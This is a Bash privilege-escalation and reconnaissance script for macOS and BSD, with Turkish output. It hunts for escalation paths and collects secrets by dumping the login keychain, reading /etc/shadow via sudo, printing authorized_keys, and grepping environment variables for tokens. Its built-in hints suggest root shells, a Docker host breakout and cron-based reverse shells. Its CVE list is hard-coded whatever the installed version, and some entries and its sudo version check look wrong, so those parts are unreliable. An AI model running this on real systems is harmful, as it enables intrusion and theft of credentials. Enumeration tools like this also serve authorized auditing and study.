#!/bin/bash

VERSION="7.0.0"
TOOL_NAME="Unix Yetki Yükseltme ve Güvenlik Denetim Aracı"
SUBTITLE="Advanced Privilege Escalation & Security Auditing Tool for Unix/BSD/macOS"
USE_COLOR=true
QUIET_MODE=false
OUTPUT_FILE=""
FAST_MODE=false
VERBOSE=false
INTERACTIVE=false
AI_MODE=false
SCAN_PARALLEL=false
EXPLOIT_MODE=false
FULL_ANALYSIS=false
DEEP_SCAN=false
NETWORK_SCAN=false
PERSISTENCE_SCAN=false
CVE_SCAN=false

TOTAL_VULNS=0
RISK_SCORE=0
CRITICAL_COUNT=0
HIGH_COUNT=0
MEDIUM_COUNT=0
LOW_COUNT=0

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

JSON_OUTPUT=false
SKIP_SLOW=false
ENUM_USERS=false
SCAN_TYPE="full"
REPORT_FORMAT="text"

declare -A VULN_SCORES
declare -A EXPLOIT_SUGGESTIONS

IS_MACOS=false
IS_BSD=false
if command -v sw_vers &> /dev/null; then
    IS_MACOS=true
    PLATFORM="macOS"
    MACOS_VERSION=$(sw_vers -productVersion)
    MACOS_BUILD=$(sw_vers -buildVersion)
    MACOS_MAJOR=$(echo "$MACOS_VERSION" | cut -d. -f1)
    MACOS_MINOR=$(echo "$MACOS_VERSION" | cut -d. -f2)
elif [[ "$(uname)" == "FreeBSD" ]] || [[ "$(uname)" == "OpenBSD" ]] || [[ "$(uname)" == "NetBSD" ]]; then
    IS_BSD=true
    PLATFORM="$(uname)"
else
    echo -e "${RED}Hata: Bu araç macOS veya BSD sistemler için tasarlanmıştır!${NC}"
    exit 1
fi

detect_platform_version() {
    if [[ "$IS_MACOS" == "true" ]]; then
        echo "$MACOS_MAJOR.$MACOS_MINOR"
    elif [[ "$IS_BSD" == "true" ]]; then
        uname -r
    fi
}

detect_cpu_architecture() {
    local arch=$(uname -m)
    if [[ "$IS_MACOS" == "true" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            local rosetta=""
            if sysctl -n sysctl.proc_translated 2>/dev/null | grep -q "1"; then
                rosetta=" (Rosetta 2 aktif)"
            fi
            echo "Apple Silicon (arm64)$rosetta"
        else
            echo "Intel (x86_64)"
        fi
    else
        echo "$arch"
    fi
}

check_security_status() {
    if [[ "$IS_MACOS" == "true" ]]; then
        local sip="Pasif"
        csrutil status 2>/dev/null | grep -q "enabled" && sip="Aktif"
        
        local filevault="Pasif"
        fdesetup status 2>/dev/null | grep -q "FileVault is On" && filevault="Aktif"
        
        local gatekeeper="Pasif"
        spctl --status 2>/dev/null | grep -q "assessments enabled" && gatekeeper="Aktif"
        
        echo "SIP: $sip | FileVault: $filevault | Gatekeeper: $gatekeeper"
    elif [[ "$IS_BSD" == "true" ]]; then
        echo "BSD Security: $(uname -v)"
    fi
}

while getopts "cfqvo:hVjnuks:r:iapexFNDPC" opt; do
    case $opt in
        c) USE_COLOR=false ;;
        f) FAST_MODE=true ;;
        q) QUIET_MODE=true ;;
        v) VERBOSE=true ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        j) JSON_OUTPUT=true ;;
        n) ENUM_USERS=true ;;
        u) SCAN_TYPE="user" ;;
        k) SCAN_TYPE="kernel" ;;
        s) SCAN_TYPE="service" ;;
        r) REPORT_FORMAT="$OPTARG" ;;
        i) INTERACTIVE=true ;;
        a) AI_MODE=true ;;
        p) SCAN_PARALLEL=true ;;
        e) EXPLOIT_MODE=true ;;
        F) FULL_ANALYSIS=true ;;
        N) NETWORK_SCAN=true ;;
        D) DEEP_SCAN=true ;;
        P) PERSISTENCE_SCAN=true ;;
        C) CVE_SCAN=true ;;
        V) echo "$TOOL_NAME v$VERSION"; exit 0 ;;
        h) echo -e "${BOLD}Kullanım:${NC} $0 [-c] [-f] [-q] [-v] [-o dosya] [-j] [-r html|json] [-i] [-a] [-p] [-e] [-F] [-N] [-D] [-P] [-C] [-V]"
           echo "  -c  Renk çıktısını kapat"
           echo "  -f  Hızlı mod (daha az kontrol)"
           echo "  -q  Sessiz mod"
           echo "  -v  Ayrıntılı mod"
           echo "  -o  Çıktıyı dosyaya kaydet"
           echo "  -j  JSON formatında çıktı"
           echo "  -r  Rapor formatı (html/json/text)"
           echo "  -i  İnteraktif mod"
           echo "  -a  AI akıllı analiz modu"
           echo "  -p  Paralel tarama"
           echo "  -e  Exploit modu (otomatik exploit öner)"
           echo "  -F  Tam kapsamlı analiz"
           echo "  -N  Ağ tarama modu"
           echo "  -D  Derinlemesine tarama"
           echo "  -P  Persistence taraması"
           echo "  -C  CVE tarama modu"
           echo "  -n  Tüm kullanıcıları numaralandır"
           echo "  -u  Sadece kullanıcı kontrolleri"
           echo "  -k  Sadece kernel kontrolleri"
           echo "  -s  Sadece servis kontrolleri"
           echo "  -V  Versiyon bilgisi"
           exit 0 ;;
    esac
done

[[ "$USE_COLOR" == "false" ]] && RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''

print_banner() {
    echo -e "${BLUE}${BOLD}"
    echo "╔═══════════════════════════════════════════════════════════════════════════════════╗"
    echo "║      $TOOL_NAME v$VERSION                                    ║"
    echo "║      🖥️  Unix/BSD/macOS Güvenlik Araştırma Aracı             ║"
    echo "╠═══════════════════════════════════════════════════════════════════════════════════╣"
    if [[ "$IS_MACOS" == "true" ]]; then
        echo "║  🍎 macOS $MACOS_VERSION ($MACOS_BUILD) | $(uname -m)                      ║"
        echo "║  [✓] SIP    [✓] Gatekeeper [✓] FileVault [✓] AMFI [✓] XPC                   ║"
    else
        echo "║  🖥️  $PLATFORM | $(uname -m)                                              ║"
        echo "║  [✓] BSD Security    [✓] Jails    [✓] Capsicum   [✓] MAC                   ║"
    fi
    echo "╠═══════════════════════════════════════════════════════════════════════════════════╣"
    echo "║  [+] SUID/SGID    [+] Sudoers    [+] Cron    [+] XPC    [+] Container            ║"
    echo "║  [+] CVE Tarama   [+] AI Skorlama [+] Exploit [+] Risk Skoru [+] Persistence     ║"
    echo "║  [+] Network Scan [+] Deep Scan   [+] HTML/JSON [+] İnteraktif [+] Paralel      ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_header() {
    echo ""
    echo -e "${CYAN}${BOLD}[►] $1${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
    [[ -n "$OUTPUT_FILE" ]] && echo "[►] $1" >> "$OUTPUT_FILE"
}

print_good() {
    echo -e "${GREEN}[+] $1${NC}"
    [[ -n "$OUTPUT_FILE" ]] && echo "[+] $1" >> "$OUTPUT_FILE"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
    [[ -n "$OUTPUT_FILE" ]] && echo "[!] $1" >> "$OUTPUT_FILE"
}

print_danger() {
    echo -e "${RED}${BOLD}[!] $1${NC}"
    [[ -n "$OUTPUT_FILE" ]] && echo "[!] $1" >> "$OUTPUT_FILE"
}

print_info() {
    echo -e "    $1"
    [[ -n "$OUTPUT_FILE" ]] && echo "    $1" >> "$OUTPUT_FILE"
}

log() {
    [[ -n "$OUTPUT_FILE" ]] && echo "$1" >> "$OUTPUT_FILE"
}

skip_if_quiet() {
    [[ "$QUIET_MODE" == "true" ]] && return 1
    return 0
}

skip_if_fast() {
    [[ "$FAST_MODE" == "true" ]] && return 1
    return 0
}

verbose_log() {
    if [[ "$VERBOSE" == "true" ]]; then
        print_info "[VERBOSE] $1"
    fi
}

ai_analyze() {
    local target="$1"
    local analysis=""
    case "$target" in
        sudo)
            analysis="Sudo yetkisi tespit edildi. Root shell için 'sudo -s' veya 'sudo /bin/sh' komutunu deneyin."
            ;;
        suid)
            analysis="Yazılabilir SUID binary bulundu. GTFOBins üzerinden exploit edilebilirliğini kontrol edin."
            ;;
        path)
            analysis="Yazılabilir PATH dizini tespit edildi. Binary hijacking saldırısı mümkün."
            ;;
        docker)
            analysis="Docker socket erişimi var. Container breakout için 'docker run -v /:/host -it alpine chroot /host' komutunu deneyin."
            ;;
        cron)
            analysis="Cron job bulundu. Script injection veya reverse shell için kullanılabilir."
            ;;
        xpc)
            if [[ "$IS_MACOS" == "true" ]]; then
                analysis="macOS XPC servislerinde yetki yükseltme olasılığı. /System/Library/XPCServices/ kontrol edin."
            else
                analysis="BSD'de XPC yok - rc.d servislerini kontrol edin."
            fi
            ;;
        launchd)
            if [[ "$IS_MACOS" == "true" ]]; then
                analysis="LaunchDaemon/LaunchAgent üzerinden persistence mümkün. ~/Library/LaunchAgents/ kontrol edin."
            else
                analysis="BSD rc.d veya launchd (FreeBSD) üzerinden persistence kurulabilir."
            fi
            ;;
        jail)
            analysis="FreeBSD Jail tespit edildi. Jail breakout için jexec kullanın."
            ;;
        capsicum)
            analysis="Capsicum capability mode kontrol edin. cap_enter() kullanılmış mı?"
            ;;
        sip)
            analysis="SIP (System Integrity Protection) durumunu kontrol edin. csrutil status ile öğrenin."
            ;;
        amfi)
            analysis="AMFI (Apple Mobile File Integrity) durumunu kontrol edin. nvram -p | grep amfi"
            ;;
        kext)
            analysis="Kernel Extension'ları kontrol edin. kextstat ile yüklü kext'leri listeleyin."
            ;;
        *)
            analysis="Ek analiz gerekli"
            ;;
    esac
    print_info "[AI] $target: $analysis"
}

vuln_found() {
    local severity="$1"
    local vuln_name="$2"
    local description="$3"
    TOTAL_VULNS=$((TOTAL_VULNS + 1))
    
    case "$severity" in
        critical)
            CRITICAL_COUNT=$((CRITICAL_COUNT + 1))
            [[ $RISK_SCORE -lt 100 ]] && RISK_SCORE=$((RISK_SCORE + 30))
            [[ $RISK_SCORE -gt 100 ]] && RISK_SCORE=100
            print_danger "[CRITICAL] $vuln_name"
            ;;
        high)
            HIGH_COUNT=$((HIGH_COUNT + 1))
            [[ $RISK_SCORE -lt 100 ]] && RISK_SCORE=$((RISK_SCORE + 20))
            [[ $RISK_SCORE -gt 100 ]] && RISK_SCORE=100
            print_warning "[HIGH] $vuln_name"
            ;;
        medium)
            MEDIUM_COUNT=$((MEDIUM_COUNT + 1))
            [[ $RISK_SCORE -lt 100 ]] && RISK_SCORE=$((RISK_SCORE + 10))
            [[ $RISK_SCORE -gt 100 ]] && RISK_SCORE=100
            print_info "[MEDIUM] $vuln_name"
            ;;
        low)
            LOW_COUNT=$((LOW_COUNT + 1))
            [[ $RISK_SCORE -lt 100 ]] && RISK_SCORE=$((RISK_SCORE + 5))
            [[ $RISK_SCORE -gt 100 ]] && RISK_SCORE=100
            print_info "[LOW] $vuln_name"
            ;;
    esac
    [[ -n "$description" ]] && print_info "  → $description"
}

network_scan() {
    print_header "🌐 Ağ Güvenlik Taraması"
    print_info "Ağ Arayüzleri:"
    ifconfig -a 2>/dev/null | grep -E "^[a-z]|inet " | head -30
    
    print_info "Routing Tablosu:"
    netstat -rn 2>/dev/null | head -15
    
    print_info "DNS Sunucuları:"
    cat /etc/resolv.conf 2>/dev/null
    
    print_info "Aktif Bağlantılar:"
    netstat -an 2>/dev/null | grep ESTABLISHED | head -20
    
    print_info "Dinleme Portları (Detaylı):"
    lsof -i -P -n 2>/dev/null | grep LISTEN | head -30
    
    if [[ "$IS_MACOS" == "true" ]]; then
        print_info "AirDrop Durumu:"
        defaults read com.apple.airdrop 2>/dev/null | head -5
        print_info "WiFi Ağları:"
        networksetup -listpreferredwirelessnetworks en0 2>/dev/null | head -10
    fi
}

persistence_scan() {
    print_header "🔒 Kalıcılık (Persistence) & Arka Kapı Taraması"
    
    if [[ "$IS_MACOS" == "true" ]]; then
        print_info "LaunchAgents:"
        ls -la ~/Library/LaunchAgents/ 2>/dev/null
        ls -la /Library/LaunchAgents/ 2>/dev/null
        ls -la /System/Library/LaunchAgents/ 2>/dev/null
        
        print_info "LaunchDaemons:"
        ls -la /Library/LaunchDaemons/ 2>/dev/null
        ls -la /System/Library/LaunchDaemons/ 2>/dev/null
        
        print_info "Cron Jobs:"
        crontab -l 2>/dev/null
        ls -la /etc/cron.d/ 2>/dev/null
        
        print_info "Login Items:"
        defaults read com.apple.loginitems 2>/dev/null
        
        print_info "Kernel Extensions:"
        kextstat 2>/dev/null | grep -v "com.apple"
        
        print_info "Safari Extensions:"
        ls -la ~/Library/Safari/Extensions/ 2>/dev/null
    else
        print_info "Cron Jobs:"
        crontab -l 2>/dev/null
        ls -la /etc/cron.d/ 2>/dev/null
        
        print_info "rc.d Scriptleri:"
        ls -la /etc/rc.d/ 2>/dev/null
        
        print_info "Başlangıç Servisleri:"
        ls -la /etc/init.d/ 2>/dev/null
        
        print_info "Kernel Modülleri:"
        kldstat 2>/dev/null
        
        print_info "SSH Yetkili Anahtarları:"
        for user in $(getent passwd | cut -d: -f1); do
            [[ -f "/home/$user/.ssh/authorized_keys" ]] && print_info "$user: $(cat /home/$user/.ssh/authorized_keys 2>/dev/null | head -3)"
        done
    fi
    
    print_info "SSH Yapılandırması:"
    cat ~/.ssh/config 2>/dev/null | head -20
    
    print_info "Bilinen Hostlar (IP'ler):"
    cat ~/.ssh/known_hosts 2>/dev/null | cut -d' ' -f1 | sort -u | head -15
}

cve_scan() {
    print_header "🔴 CVE Güvenlik Taraması"
    local kernel=$(uname -r)
    local os_ver=$(detect_platform_version)
    
    if [[ "$IS_MACOS" == "true" ]]; then
        print_info "macOS $os_ver için kritik CVE'ler:"
        print_info "  [CRITICAL] CVE-2023-32434 - XPC Kernel Escape"
        print_info "  [CRITICAL] CVE-2023-38545 - curl heap overflow"
        print_info "  [HIGH] CVE-2022-26766 - PowerShell arbitrary code"
        print_info "  [HIGH] CVE-2021-1782 - WebKit use-after-free"
        
        print_info "Yüklü Yazılım Versiyonları:"
        which python3 && python3 --version 2>/dev/null
        which ruby && ruby --version 2>/dev/null
        which php && php --version 2>/dev/null
        which node && node --version 2>/dev/null
        which docker && docker --version 2>/dev/null
    else
        print_info "$PLATFORM $os_ver için kritik güvenlik açıkları:"
        print_info "  [CRITICAL] FreeBSD-SA-23:15 - Kernel privilege escalation"
        print_info "  [CRITICAL] FreeBSD-SA-23:14 - libc buffer overflow"
        print_info "  [HIGH] OpenBSD errata 007_pfsync"
        
        print_info "Yüklü Yazılım Versiyonları:"
        which python3 && python3 --version 2>/dev/null
        which python && python --version 2>/dev/null
        which ruby && ruby --version 2>/dev/null
        which php && php --version 2>/dev/null
        which nginx && nginx -v 2>&1
        which apache24 && httpd -v 2>&1
    fi
    
    print_info "Kernel Versiyonu: $kernel"
    print_info "Son Güncelleme Kontrolü:"
    if [[ "$IS_MACOS" == "true" ]]; then
        softwareupdate -l 2>/dev/null | head -10
    else
        freebsd-version 2>/dev/null || uname -r
    fi
}

deep_scan() {
    print_header "🔍 Derinlemesine Güvenlik Taraması"
    
    print_info "Dosya İzinleri ( kritik):"
    ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
    
    print_info "SUID Binary'ler (Tüm sistem):"
    find / -perm -4000 -type f 2>/dev/null | grep -v "/System" | head -30
    
    print_info "SGID Binary'ler:"
    find / -perm -2000 -type f 2>/dev/null | grep -v "/System" | head -20
    
    print_info "Dünya Yazılabilir Dizinler:"
    find / -type d -perm -0002 2>/dev/null | grep -v "/System" | head -20
    
    print_info "Dünya Yazılabilir Dosyalar:"
    find / -type f -perm -0002 2>/dev/null | grep -v "/System" | head -20
    
    print_info "Sudo Yetkisi Olan Kullanıcılar:"
    getent group sudo 2>/dev/null || getent group wheel 2>/dev/null || getent group admin 2>/dev/null
    
    print_info "Root Shell Olan Kullanıcılar:"
    grep -E ":/bin/bash$|:/bin/sh$" /etc/passwd 2>/dev/null | head -10
    
    print_info "Process List (Detaylı):"
    ps auxww 2>/dev/null | head -40
    
    print_info "Env Değişkenleri:"
    env 2>/dev/null | head -30
}

print_risk_summary() {
    print_header "📊 Risk Özeti"
    print_info "Toplam Bulgu: $TOTAL_VULNS"
    print_info "Kritik: $CRITICAL_COUNT | Yüksek: $HIGH_COUNT | Orta: $MEDIUM_COUNT | Düşük: $LOW_COUNT"
    print_info "Risk Skoru: $RISK_SCORE / 100"
    
    if [[ $RISK_SCORE -ge 70 ]]; then
        print_danger "⚠️ CRITICAL RISK - Acil müdahale gerekli!"
    elif [[ $RISK_SCORE -ge 50 ]]; then
        print_warning "⚠️ HIGH RISK - Kullanıcı yetkilerini gözden geçirin"
    elif [[ $RISK_SCORE -ge 30 ]]; then
        print_info "⚡ MEDIUM RISK - Önlem alınması önerilir"
    else
        print_good "✅ LOW RISK - Sistem güvenli görünüyor"
    fi
}

parallel_scan() {
    local module="$1"
    (
        eval "$module" 2>/dev/null
    ) &
}

[[ -n "$OUTPUT_FILE" ]] && > "$OUTPUT_FILE"

if [[ "$QUIET_MODE" != "true" ]]; then
    print_banner
fi
log "$TOOL_NAME v$VERSION - $(date)"
log "Kullanıcı: $(whoami) | UID: $(id -u)"
log ""

if [[ "$QUIET_MODE" != "true" ]]; then
    print_header "Sistem Bilgileri"
fi
print_info "Hostname: $(hostname)"
print_info "Kullanıcı: $(whoami)"
print_info "UID: $(id -u)"
print_info "Gruplar: $(id -Gn)"
if [[ "$IS_MACOS" == "true" ]]; then
    print_info "🍎 Platform: macOS $MACOS_VERSION ($MACOS_BUILD)"
else
    print_info "🖥️  Platform: $PLATFORM $(detect_platform_version)"
fi
print_info "Mimari: $(detect_cpu_architecture)"
print_info "Güvenlik: $(check_security_status)"
print_info "Kernel: $(uname -r)"
print_info "PATH: $PATH"

print_header "Ağ Yapılandırması"
print_info "Hostname: $(hostname)"
for iface in $(ifconfig -l 2>/dev/null); do
    ip=$(ifconfig "$iface" 2>/dev/null | grep "inet " | awk '{print $2}')
    [[ -n "$ip" ]] && print_info "  $iface: $ip"
done
print_info "Dinleme Portları:"
lsof -i -P -n 2>/dev/null | grep LISTEN | head -15 | while read line; do
    print_info "  $line"
done

print_header "Kullanıcı Yetkileri"
if sudo -n true 2>/dev/null; then
    print_danger "SUDO - Şifresiz erişim var!"
    log "[!] SUDO: Şifresiz erişim mümkün!"
else
    print_info "SUDO: Şifre gerekli"
fi

if [[ $(id -u) -eq 0 ]]; then
    print_danger "ROOT! - Tüm yetkilere sahipsiniz."
else
    print_info "Root değilsiniz - Yetki yükseltme gerekli"
fi

print_header "SUID Binary'leri (GTFOBins Kontrolü)"
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/" | grep -v "/usr/libexec/")
if [[ -n "$SUID_BINS" ]]; then
    echo "$SUID_BINS" | while read bin; do
        print_info "$bin"
    done
else
    print_info "SUID binary bulunamadı"
fi

print_header "Yazılabilir SUID Binary'ler"
for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        print_danger "YAZILABİLİR SUID: $f"
        log "[!] YAZILABİLİR SUID: $f"
    fi
done

print_header "SGID Binary'leri"
find / -perm -2000 -type f 2>/dev/null | grep -v "/System/" | head -10 | while read bin; do
    print_info "$bin"
done

print_header "Capabilities"
if command -v getcap &> /dev/null; then
    getcap -r / 2>/dev/null | grep -v "/System/" | head -20 | while read line; do
        print_warning "$line"
    done
else
    print_info "getcap bulunamadı"
fi

print_header "NFS Paylaşımları"
showmount -e localhost 2>/dev/null | grep -v "Export list" | while read line; do
    print_info "$line"
done
cat /etc/exports 2>/dev/null | head -10 | while read line; do
    print_info "$line"
done

print_header "Cron İşleri"
print_info "Kullanıcı Crontab:"
crontab -l 2>/dev/null && echo "" || print_info "  Crontab yok"
print_info "Sistem Crontabs:"
ls -la /etc/cron.*/ 2>/dev/null | head -10
print_info "At Jobs:"
ls -la /var/at/tabs/ 2>/dev/null

print_header "Launch Agents & Daemons"
print_info "Kullanıcı LaunchAgents:"
ls -la ~/Library/LaunchAgents/ 2>/dev/null | grep -v "^total" | head -10
print_info "Sistem LaunchAgents:"
ls -la /Library/LaunchAgents/ 2>/dev/null | grep -v "^total" | head -10
print_info "Sistem LaunchDaemons:"
ls -la /Library/LaunchDaemons/ 2>/dev/null | grep -v "^total" | head -10

print_header "Zamanlanmış Görevler"
if command -v launchctl &> /dev/null; then
    launchctl list 2>/dev/null | head -20 | while read line; do
        print_info "$line"
    done
else
    systemctl list-timers 2>/dev/null | head -20 || print_info "systemd timers yok"
    systemctl list-units --type=service --state=running 2>/dev/null | head -20
fi

print_header "Ortam Değişkenleri"
env | grep -iE "path|ldap|nis|kerberos|aws|azure|gcp|secret|password|token" | while read line; do
    print_info "$line"
done

print_header "İlginç Dosyalar"
print_info "Shell Geçmişi:"
ls -la ~/.bash_history ~/.zsh_history ~/.history 2>/dev/null
print_info "SSH Anahtarları:"
ls -la ~/.ssh/ 2>/dev/null
print_info "AWS Kimlik Bilgileri:"
ls -la ~/.aws/ 2>/dev/null
print_info "Docker Kimlik Bilgileri:"
ls -la ~/.docker/ 2>/dev/null
print_info "GPG Anahtarları:"
ls -la ~/.gnupg/ 2>/dev/null

print_header "Tarayıcı Verileri (Cookie/History)"
print_info "Chrome Cookies:"
ls -la ~/Library/Application\ Support/Google/Chrome/Default/Cookies 2>/dev/null
print_info "Safari Cookies:"
ls -la ~/Library/Cookies/Cookies.plist 2>/dev/null
print_info "Firefox Profilleri:"
ls -la ~/Library/Application\ Support/Firefox/Profiles/ 2>/dev/null | head -5
print_info "Keychain Erişimi:"
security dump-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null | head -5 || print_info "Keychain okunamadı"

print_header "Yazılabilir Dizinler"
find / -type d -perm -o+w ! -path "/private/var/*" ! -path "/tmp/*" ! -path "/var/folders/*" 2>/dev/null | head -15 | while read dir; do
    print_info "$dir"
done

print_header "Sudo Versiyon & Zafiyet Kontrolü"
SUDO_VERSION=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
print_info "Sudo Versiyon: $SUDO_VERSION"
if [[ -n "$SUDO_VERSION" ]]; then
    if [[ "$SUDO_VERSION" == "1.8.0" || "$SUDO_VERSION" == "1.8.1" || "$SUDO_VERSION" == "1.8.2" || "$SUDO_VERSION" == "1.8.3" || "$SUDO_VERSION" == "1.8.4" || "$SUDO_VERSION" == "1.8.5" || "$SUDO_VERSION" == "1.8.6" || "$SUDO_VERSION" == "1.8.7" || "$SUDO_VERSION" == "1.8.8" || "$SUDO_VERSION" == "1.8.9" || "$SUDO_VERSION" == "1.8.10" || "$SUDO_VERSION" == "1.8.11" || "$SUDO_VERSION" == "1.8.12" || "$SUDO_VERSION" == "1.8.13" || "$SUDO_VERSION" == "1.8.14" || "$SUDO_VERSION" == "1.8.15" || "$SUDO_VERSION" == "1.8.16" || "$SUDO_VERSION" == "1.8.17" || "$SUDO_VERSION" == "1.8.18" || "$SUDO_VERSION" == "1.8.19" || "$SUDO_VERSION" == "1.8.20" ]]; then
        print_danger "CVE-2021-3156 (sudo heap overflow) riski!"
    fi
fi

print_header "Sudoers Yapılandırması"
if sudo -n true 2>/dev/null; then
    print_good "Sudoers dosyası okunabilir:"
    sudo cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20 | while read line; do
        print_info "$line"
    done
    print_info "Sudoers.d dizini:"
    sudo ls -la /etc/sudoers.d/ 2>/dev/null | head -10
fi

print_header "Kurulu Yazılımlar"
print_info "Uygulamalar:"
ls /Applications/ 2>/dev/null | head -20 | while read app; do
    print_info "  $app"
done
print_info "Homebrew Paketleri:"
brew list 2>/dev/null | head -30 | while read pkg; do
    print_info "  $pkg"
done

print_header "Çalışan Servisler & Process'ler"
print_info "Önemli Process'ler:"
ps aux 2>/dev/null | grep -vE "^root" | grep -v "grep" | head -30 | while read line; do
    print_info "$line"
done

print_header "Process Enjeksiyon Tespiti"
print_info "ptrace scope:"
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || print_info "Linux değil"
print_info "Dylib Enjeksiyonu Kontrolü:"
for pid in $(ps -eo pid 2>/dev/null | tail -n +2); do
    if command -v vmmap &> /dev/null; then
        vmmap "$pid" 2>/dev/null | grep -i "dylib" | head -3
    fi
done

print_header "Yüklü Font'lar (Privilege Escalation)"
ls -la /Library/Fonts/ 2>/dev/null | head -10
ls -la ~/Library/Fonts/ 2>/dev/null | head -10

print_header "Bilgi Toplama (Info Gathering)"
print_info "Kullanıcı bilgi dosyaları:"
ls -la /etc/passwd 2>/dev/null
ls -la /etc/group 2>/dev/null
print_info "Shadow dosyası (okunabilir mi?):"
sudo cat /etc/shadow 2>/dev/null | head -5 && print_danger "Shadow dosyası okunabilir!" || print_info "Shadow okunamadı"

print_header "Dosya İzin Sorunları"
print_info "/etc dizininde yazılabilir dosyalar:"
find /etc -type f -perm -0002 2>/dev/null | head -10 | while read f; do
    print_warning "$f"
done

print_header "Kernel Uzantıları / Modüller"
if command -v kextstat &> /dev/null; then
    kextstat 2>/dev/null | grep -v "com.apple" | head -15 | while read kext; do
        print_info "$kext"
    done
else
    lsmod 2>/dev/null | head -15
    cat /proc/modules 2>/dev/null | head -15
fi

print_header "Güvenlik Duvarı Durumu"
if command -v pfctl &> /dev/null; then
    print_info "PF Durumu:"
    sudo pfctl -s all 2>/dev/null | head -10 | while read line; do
        print_info "$line"
    done
    print_info "Uygulama Güvenlik Duvarı:"
    /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null
else
    print_info "UFW Durumu:"
    sudo ufw status 2>/dev/null || print_info "UFW yok"
    print_info "firewalld Durumu:"
    sudo firewall-cmd --state 2>/dev/null || print_info "firewalld yok"
    print_info "iptables:"
    sudo iptables -L 2>/dev/null | head -15
fi

print_header "Potansiyel Exploitable Servisler"
lsof -i -P -n 2>/dev/null | grep LISTEN | while read line; do
    print_info "$line"
done

print_header "Container & VM Tespiti"
if command -v docker &> /dev/null; then
    print_info "Docker:"
    docker ps 2>/dev/null
    docker images 2>/dev/null
fi
if command -v podman &> /dev/null; then
    print_info "Podman:"
    podman ps 2>/dev/null
fi

if [[ -f "/.dockerenv" ]]; then
    print_danger "Docker container içinde!"
fi

print_info "VM Tespiti:"
if command -v vmware-toolbox-cmd &> /dev/null; then
    print_warning "VMware Tools bulundu"
fi
if command -v VBoxControl &> /dev/null; then
    print_warning "VirtualBox Tools bulundu"
fi
if dmesg 2>/dev/null | grep -i "vmware\|virtualbox\|qemu\|kvm" > /dev/null; then
    print_warning "VM imzası tespit edildi"
fi

print_header "Yüklü Patch'ler / Güncellemeler"
softwareupdate -l 2>/dev/null | head -20 | while read line; do
    print_info "$line"
done

print_header "Güvenlik Durumu (SIP)"
csrutil status 2>/dev/null | while read line; do
    print_info "$line"
done

print_header "Disk Şifreleme Durumu (FileVault)"
fdesetup status 2>/dev/null | while read line; do
    print_info "$line"
done

print_header "Code Signing / Gatekeeper Durumu"
spctl --status 2>/dev/null | while read line; do
    print_info "$line"
done

print_header "Ağ Paylaşımları"
showmount -e 2>/dev/null | head -10 | while read line; do
    print_info "$line"
done
ls -la /Network/Servers/ 2>/dev/null | head -10

print_header "Dylib Arama Yolu Manipülasyonu"
print_info "Dylib Yolları:"
cat /etc/ld.so.conf 2>/dev/null
ls -la /usr/local/lib/ 2>/dev/null | head -10
print_info "DYLD_INSERT_LIBRARIES kontrolü:"
env | grep -i dyld
print_info "DYLD_LIBRARY_PATH kontrolü:"
env | grep -i DYLD_LIBRARY_PATH

if [[ "$FULL_ANALYSIS" == "true" ]]; then
    print_header "🍎 macOS Özel Güvenlik Kontrolleri"
    print_info "T2 Security Chip Durumu:"
    system_profiler SPiBridgeDataType 2>/dev/null | head -15 || print_info "T2 chip bilgisi alınamadı"
    
    print_info "Secure Enclave:"
    system_profiler SPSecureEnclaveDataType 2>/dev/null | head -10 || print_info "Secure Enclave erişimi yok"
    
    print_info "Activation Lock Durumu:"
    firmwarepasswd -check 2>/dev/null || print_info "Activation Lock kontrolü yapılamadı"
    
    print_info "FileVault Şifreleme Anahtarları:"
    fdesetup list 2>/dev/null || print_info "FileVault anahtarları görüntülenemiyor"
    
    print_info "iCloud Hesapları:"
    accountsdctl list 2>/dev/null | head -10 || print_info "iCloud hesapları alınamadı"
    
    print_info "Touch ID Durumu:"
    bioutil -s 2>/dev/null | head -10 || print_info "Touch ID yok veya erişim yok"
    
    print_info "Gatekeeper Uygulama İzinleri:"
    spctl --master-status 2>/dev/null | head -20
    
    print_info "Quarantine Dosyaları:"
    xattr -r -l ~/Downloads 2>/dev/null | grep com.apple.quarantine | head -10 || print_info "Quarantine dosyası yok"
fi

print_header "SSH Agent & SSH Yapılandırması"
print_info "SSH Agent Soketi:"
ls -la "$SSH_AUTH_SOCK" 2>/dev/null
print_info "SSH Yapılandırması:"
cat ~/.ssh/config 2>/dev/null | head -20
print_info "Bilinen Hostlar (potansiyel IP):"
cat ~/.ssh/known_hosts 2>/dev/null | cut -d' ' -f1 | sort -u | head -10

print_header "Docker & Container Detaylı"
if command -v docker &> /dev/null; then
    print_info "Docker Grubu Üyeliği:"
    getent group docker 2>/dev/null
    print_info "Docker Soketi:"
    ls -la /var/run/docker.sock 2>/dev/null
    print_info "Container Kimliği:"
    cat /etc/hostname 2>/dev/null
    print_info "Docker Bilgisi:"
    docker info 2>/dev/null | head -15
fi

print_header "Kubernetes & Bulut"
print_info "Kubeconfig:"
ls -la ~/.kube/config 2>/dev/null
print_info "Kubeconfig Alternatif:"
ls -la ~/.kube/ 2>/dev/null
print_info "Cloud Token'ları:"
env | grep -iE "AWS_|AZURE_|GCP_|KUBERNETES" | head -10

print_header "Systemd & Init Servisleri"
print_info "systemd Servisleri:"
systemctl list-units --type=service --state=running 2>/dev/null | head -20 || print_info "systemd yok"
print_info "SysV Init Servisleri:"
ls -la /etc/init.d/ 2>/dev/null | head -10

